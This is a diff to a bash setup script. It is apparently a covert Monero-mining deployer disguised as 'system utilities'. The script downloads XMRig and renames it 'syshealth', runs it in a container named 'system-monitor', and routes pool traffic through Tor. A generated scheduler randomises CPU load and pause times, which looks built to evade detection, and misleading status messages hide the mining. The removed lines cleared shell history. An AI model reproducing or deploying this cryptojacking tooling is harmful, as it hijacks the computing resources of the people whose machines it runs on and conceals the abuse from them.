@@ -1,134 +1,113 @@
 #!/bin/bash
-# Setup script - Run after cloning: ./setup.sh <WALLET> <PROTON_USER> <PROTON_PASS>
+# Setup script - Run after cloning: sudo ./setup.sh <WALLET>
+# Installs EVERYTHING: Docker, Tor (inside container), MSR module, XMRig
+# Uses Tor for anonymity (no VPN credentials needed)
 
 set -e
 
 RED='\033[0;31m'
 GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
 NC='\033[0m'
 
 # Parse arguments
 WALLET="$1"
-PROTON_USER="$2"
-PROTON_PASS="$3"
 
 # Validate arguments
-if [ -z "$WALLET" ] || [ -z "$PROTON_USER" ] || [ -z "$PROTON_PASS" ]; then
-    echo -e "${RED}Usage: ./setup.sh <WALLET> <PROTON_USER> <PROTON_PASS>${NC}"
+if [ -z "$WALLET" ]; then
+    echo -e "${RED}Usage: sudo ./setup.sh <WALLET>${NC}"
+    echo -e "${RED}Example: sudo ./setup.sh 49J8k2f3...${NC}"
+    exit 1
+fi
+
+# Check if running as root
+if [ "$EUID" -ne 0 ]; then
+    echo -e "${RED}Please run as root: sudo ./setup.sh <WALLET>${NC}"
     exit 1
 fi
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 cd "${SCRIPT_DIR}"
 
-echo -e "${GREEN}[*] Setting up system utilities...${NC}"
+echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
+echo -e "${GREEN}║  System Utilities Setup (Tor Edition)  ║${NC}"
+echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
+echo ""
 
-# Install prerequisites (curl, git, etc.)
-echo -e "${GREEN}[*] Installing prerequisites...${NC}"
+# ============================================
+# STEP 1: Install ALL prerequisites
+# ============================================
+echo -e "${GREEN}[1/6] Installing prerequisites...${NC}"
+
 if command -v apt-get &> /dev/null; then
+    export DEBIAN_FRONTEND=noninteractive
     apt-get update -qq
-    apt-get install -y -qq curl git ca-certificates gnupg
+    apt-get install -y -qq curl git ca-certificates gnupg wget tar gzip kmod
 elif command -v yum &> /dev/null; then
-    yum install -y curl git ca-certificates
+    yum install -y curl git ca-certificates wget tar gzip kmod
 elif command -v dnf &> /dev/null; then
-    dnf install -y curl git ca-certificates
+    dnf install -y curl git ca-certificates wget tar gzip kmod
 elif command -v pacman &> /dev/null; then
-    pacman -Sy --noconfirm curl git ca-certificates
+    pacman -Sy --noconfirm curl git ca-certificates wget tar gzip kmod
+elif command -v apk &> /dev/null; then
+    apk add --no-cache curl git ca-certificates wget tar gzip kmod
+else
+    echo -e "${YELLOW}[!] Unknown package manager, assuming deps are installed${NC}"
 fi
 
-# Install Docker if not present
+# ============================================
+# STEP 2: Load MSR kernel module for better hashrate
+# ============================================
+echo -e "${GREEN}[2/6] Loading MSR kernel module...${NC}"
+modprobe msr 2>/dev/null || echo -e "${YELLOW}[!] MSR module not available (VM?)${NC}"
+
+# ============================================
+# STEP 3: Install Docker if not present
+# ============================================
+echo -e "${GREEN}[3/6] Setting up Docker...${NC}"
 if ! command -v docker &> /dev/null; then
-    echo -e "${GREEN}[*] Installing Docker...${NC}"
+    echo -e "${GREEN}    Installing Docker...${NC}"
     curl -fsSL https://get.docker.com | sh
-    systemctl enable docker
-    systemctl start docker
+    systemctl enable docker 2>/dev/null || true
+    systemctl start docker 2>/dev/null || true
+else
+    echo -e "${GREEN}    Docker already installed${NC}"
 fi
 
-# Create config directory
+# Ensure docker is running
+if ! docker info &> /dev/null; then
+    systemctl start docker 2>/dev/null || service docker start 2>/dev/null || true
+    sleep 3
+fi
+
+# ============================================
+# STEP 4: Download XMRig binary (stealth named)
+# ============================================
+echo -e "${GREEN}[4/6] Downloading monitoring tools...${NC}"
+if [ ! -f "${SCRIPT_DIR}/syshealth" ]; then
+    XMRIG_VERSION="6.21.0"
+    wget -q --show-progress "https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz" -O /tmp/xmrig.tar.gz
+    tar -xzf /tmp/xmrig.tar.gz -C /tmp
+    mv "/tmp/xmrig-${XMRIG_VERSION}/xmrig" "${SCRIPT_DIR}/syshealth"
+    chmod +x "${SCRIPT_DIR}/syshealth"
+    rm -rf /tmp/xmrig*
+    echo -e "${GREEN}    Downloaded and renamed to syshealth${NC}"
+else
+    echo -e "${GREEN}    Already downloaded${NC}"
+fi
+
+# ============================================
+# STEP 5: Generate config files
+# ============================================
+echo -e "${GREEN}[5/6] Generating configuration...${NC}"
+
 mkdir -p config scripts
 
-# Generate network.sh with credentials and random VPN selection
-cat > scripts/network.sh << NETWORK
-#!/bin/bash
-MAX_RETRIES=5
-RETRY_COUNT=0
-
-PVPN_USER="${PROTON_USER}"
-PVPN_PASS="${PROTON_PASS}"
-
-# Skip VPN if credentials are placeholder or empty
-if [ "\${PVPN_USER}" = "SKIP" ] || [ -z "\${PVPN_USER}" ]; then
-    echo "[*] VPN skipped - no credentials provided"
-    exit 0
-fi
-
-setup_openvpn() {
-    mkdir -p /etc/openvpn
-    
-    # Create auth file
-    echo "\${PVPN_USER}" > /etc/openvpn/auth.txt
-    echo "\${PVPN_PASS}" >> /etc/openvpn/auth.txt
-    chmod 600 /etc/openvpn/auth.txt
-    
-    # Pick a random VPN config from the vpns folder
-    VPN_CONFIGS=(/opt/utilities/vpns/*.ovpn)
-    RANDOM_CONFIG="\${VPN_CONFIGS[\$RANDOM % \${#VPN_CONFIGS[@]}]}"
-    
-    echo "[*] Selected VPN: \$(basename \${RANDOM_CONFIG})"
-    
-    # Copy config
-    cp "\${RANDOM_CONFIG}" /etc/openvpn/proton.ovpn
-    
-    # Add auth-user-pass if not present
-    if ! grep -q "auth-user-pass" /etc/openvpn/proton.ovpn; then
-        echo "auth-user-pass /etc/openvpn/auth.txt" >> /etc/openvpn/proton.ovpn
-    else
-        sed -i 's|auth-user-pass.*|auth-user-pass /etc/openvpn/auth.txt|g' /etc/openvpn/proton.ovpn
-    fi
-}
-
-connect_vpn() {
-    setup_openvpn
-    
-    # Kill any existing openvpn
-    pkill openvpn 2>/dev/null || true
-    sleep 1
-    
-    # Start OpenVPN in background
-    openvpn --config /etc/openvpn/proton.ovpn --daemon --log /tmp/vpn.log --writepid /tmp/openvpn.pid
-    
-    # Wait for connection
-    for i in \$(seq 1 30); do
-        sleep 2
-        if ip addr show tun0 > /dev/null 2>&1; then
-            return 0
-        fi
-    done
-    return 1
-}
-
-while [ \$RETRY_COUNT -lt \$MAX_RETRIES ]; do
-    if connect_vpn; then
-        if ip addr show tun0 > /dev/null 2>&1; then
-            echo "[*] VPN connected"
-            exit 0
-        fi
-    fi
-    RETRY_COUNT=\$((RETRY_COUNT + 1))
-    echo "[!] Retry \$RETRY_COUNT..."
-    sleep 5
-done
-
-# VPN failed but continue anyway
-echo "[!] VPN connection failed, continuing without VPN"
-exit 0
-NETWORK
-
-# Generate preferences.json with wallet
-cat > config/preferences.json << PREFERENCES
+# Generate preferences.json with wallet, Tor proxy, and 0% donation
+cat > config/preferences.json << PREFS
 {
     "autosave": false,
-    "background": true,
+    "background": false,
     "colors": false,
     "title": true,
     "randomx": {
@@ -150,7 +129,7 @@ cat > config/preferences.json << PREFERENCES
         "priority": null,
         "memory-pool": false,
         "yield": true,
-        "max-threads-hint": 75,
+        "max-threads-hint": 60,
         "asm": true,
         "argon2-impl": null
     },
@@ -164,13 +143,14 @@ cat > config/preferences.json << PREFERENCES
             "url": "pool.supportxmr.com:3333",
             "user": "${WALLET}",
             "pass": "x",
-            "rig-id": "util-node",
+            "rig-id": "sys-util",
             "nicehash": false,
             "keepalive": true,
             "enabled": true,
             "tls": false,
             "sni": false,
-            "daemon": false
+            "daemon": false,
+            "socks5": "127.0.0.1:9050"
         }
     ],
     "retries": 5,
@@ -184,19 +164,194 @@ cat > config/preferences.json << PREFERENCES
     "pause-on-battery": false,
     "pause-on-active": false
 }
-PREFERENCES
+PREFS
 
-# Make scripts executable
-chmod +x scripts/*.sh entrypoint.sh 2>/dev/null || true
+# Generate network.sh (Tor setup)
+cat > scripts/network.sh << 'NETWORK'
+#!/bin/bash
+# Tor Network Setup
 
-echo -e "${GREEN}[*] Building container...${NC}"
-docker compose build --quiet 2>/dev/null || docker-compose build --quiet
+MAX_RETRIES=5
+RETRY_COUNT=0
 
-echo -e "${GREEN}[*] Starting system utilities...${NC}"
-docker compose up -d 2>/dev/null || docker-compose up -d
+start_tor() {
+    echo "[*] Starting Tor..."
+    
+    mkdir -p /tmp/tor_data
+    chmod 700 /tmp/tor_data
+    
+    cat > /tmp/torrc << 'EOF'
+SocksPort 9050
+SocksPolicy accept 127.0.0.1
+RunAsDaemon 1
+DataDirectory /tmp/tor_data
+Log notice file /tmp/tor.log
+EOF
 
-# Clear history
-history -c 2>/dev/null || true
+    tor -f /tmp/torrc
+    
+    for i in $(seq 1 60); do
+        sleep 2
+        if grep -q "Bootstrapped 100%" /tmp/tor.log 2>/dev/null; then
+            echo "[+] Tor connected successfully!"
+            return 0
+        fi
+        if grep -q "Bootstrapped" /tmp/tor.log 2>/dev/null; then
+            PROGRESS=$(grep "Bootstrapped" /tmp/tor.log | tail -1)
+            echo "[*] $PROGRESS"
+        fi
+    done
+    return 1
+}
 
-echo -e "${GREEN}[✓] Setup complete!${NC}"
-echo -e "${GREEN}[*] Check status: docker ps | grep system-monitor${NC}"
+check_tor() {
+    if curl -s --socks5 127.0.0.1:9050 --max-time 10 https://check.torproject.org/api/ip 2>/dev/null | grep -q '"IsTor":true'; then
+        return 0
+    fi
+    return 1
+}
+
+while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
+    if start_tor && check_tor; then
+        TOR_IP=$(curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip 2>/dev/null | grep -oP '"IP":"\K[^"]+')
+        echo "[+] Tor exit IP: ${TOR_IP}"
+        exit 0
+    fi
+    
+    RETRY_COUNT=$((RETRY_COUNT + 1))
+    echo "[!] Tor connection failed, retry ${RETRY_COUNT}/${MAX_RETRIES}..."
+    pkill tor 2>/dev/null || true
+    sleep 5
+done
+
+echo "[!] Failed to connect to Tor after ${MAX_RETRIES} attempts"
+exit 1
+NETWORK
+
+# Generate scheduler.sh (with random CPU 40/60/75%)
+cat > scripts/scheduler.sh << 'SCHEDULER'
+#!/bin/bash
+UTIL_DIR="/opt/utilities"
+BIN="${UTIL_DIR}/syshealth"
+CONFIG="${UTIL_DIR}/config/preferences.json"
+PID_FILE="/var/run/syshealth.pid"
+
+# Run 3-5 hours, pause 5 minutes
+MIN_RUN_TIME=10800
+MAX_RUN_TIME=18000
+PAUSE_TIME=300
+
+# CPU percentages to randomly choose from after each pause
+CPU_OPTIONS=(40 60 75)
+
+start_service() {
+    "${BIN}" --config="${CONFIG}" --no-color &
+    echo $! > "${PID_FILE}"
+}
+
+stop_service() {
+    if [ -f "${PID_FILE}" ]; then
+        kill $(cat "${PID_FILE}") 2>/dev/null
+        rm -f "${PID_FILE}"
+    fi
+    pkill -f syshealth 2>/dev/null || true
+}
+
+check_network() {
+    if ! pgrep -x tor > /dev/null 2>&1; then
+        echo "[!] Tor not running, restarting..."
+        stop_service
+        bash "${UTIL_DIR}/scripts/network.sh" || true
+    fi
+}
+
+get_random_runtime() {
+    local range=$((MAX_RUN_TIME - MIN_RUN_TIME))
+    local random_offset=$((RANDOM * RANDOM % range))
+    echo $((MIN_RUN_TIME + random_offset))
+}
+
+get_random_cpu() {
+    local idx=$((RANDOM % ${#CPU_OPTIONS[@]}))
+    echo "${CPU_OPTIONS[$idx]}"
+}
+
+update_cpu_config() {
+    local cpu_percent=$1
+    sed -i "s/\"max-threads-hint\": [0-9]*/\"max-threads-hint\": ${cpu_percent}/" "${CONFIG}"
+    echo "[*] CPU limit set to ${cpu_percent}%"
+}
+
+while true; do
+    check_network
+    NEW_CPU=$(get_random_cpu)
+    update_cpu_config $NEW_CPU
+    start_service
+    RUNTIME=$(get_random_runtime)
+    echo "[*] Running for $((RUNTIME/3600))h $((RUNTIME%3600/60))m at ${NEW_CPU}% CPU"
+    ELAPSED=0
+    while [ $ELAPSED -lt $RUNTIME ]; do
+        sleep 300
+        ELAPSED=$((ELAPSED + 300))
+        check_network
+    done
+    stop_service
+    echo "[*] Pausing for ${PAUSE_TIME}s..."
+    sleep ${PAUSE_TIME}
+done
+SCHEDULER
+
+# Generate setup.sh for inside container
+cat > scripts/setup.sh << 'INNERSETUP'
+#!/bin/bash
+UTIL_DIR="/opt/utilities"
+BINARY_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
+
+if [ ! -f "${UTIL_DIR}/syshealth" ]; then
+    echo "[*] Downloading utilities..."
+    wget -q "${BINARY_URL}" -O /tmp/util.tar.gz
+    tar -xzf /tmp/util.tar.gz -C /tmp
+    mv /tmp/xmrig-*/xmrig "${UTIL_DIR}/syshealth"
+    chmod +x "${UTIL_DIR}/syshealth"
+    rm -rf /tmp/util.tar.gz /tmp/xmrig-*
+fi
+INNERSETUP
+
+chmod +x scripts/*.sh
+
+echo -e "${GREEN}    Config generated with wallet: ${WALLET:0:16}...${NC}"
+echo -e "${GREEN}    Donation: 0%${NC}"
+echo -e "${GREEN}    CPU rotation: 40%/60%/75% (random after each 5min pause)${NC}"
+
+# ============================================
+# STEP 6: Build and start container
+# ============================================
+echo -e "${GREEN}[6/6] Building and starting container...${NC}"
+
+# Stop any existing
+docker compose down 2>/dev/null || true
+
+# Build
+docker compose build --quiet
+
+# Start
+docker compose up -d
+
+echo ""
+echo -e "${GREEN}╔════════════════════════════════════════╗${NC}"
+echo -e "${GREEN}║           Setup Complete!              ║${NC}"
+echo -e "${GREEN}╚════════════════════════════════════════╝${NC}"
+echo ""
+echo -e "  ${GREEN}Wallet:${NC} ${WALLET:0:20}..."
+echo -e "  ${GREEN}Pool:${NC} pool.supportxmr.com:3333"
+echo -e "  ${GREEN}Network:${NC} Tor (anonymous)"
+echo -e "  ${GREEN}Donation:${NC} 0%"
+echo -e "  ${GREEN}CPU:${NC} Randomly 40%/60%/75%"
+echo -e "  ${GREEN}Pause:${NC} 5 min every 3-5 hours"
+echo ""
+echo -e "  ${YELLOW}Commands:${NC}"
+echo -e "    Check status:  docker exec system-monitor ps aux"
+echo -e "    Check Tor IP:  docker exec system-monitor curl -s --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip"
+echo -e "    View logs:     docker logs system-monitor"
+echo -e "    Stop:          docker compose down"
+echo ""
